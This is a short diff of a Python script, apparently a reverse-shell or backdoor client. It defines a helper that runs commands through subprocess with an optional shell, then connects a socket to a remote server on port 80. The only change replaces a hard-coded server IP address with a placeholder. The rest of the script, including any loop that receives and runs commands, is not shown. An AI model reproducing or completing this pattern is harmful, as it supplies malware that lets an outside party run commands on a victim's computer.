@@ -6,8 +6,8 @@ def cmmds(cmds, isshell):
     execcmd = subprocess.Popen(cmds, shell=isshell, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     return execcmd
 
-ip = "2.7.151.80"  # Adresse IP du serveur
-port = 80  # Port d'écoute du serveur
+ip = "X.X.X.X"
+port = 80
 
 cnnect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 cnnect.connect((ip, port))
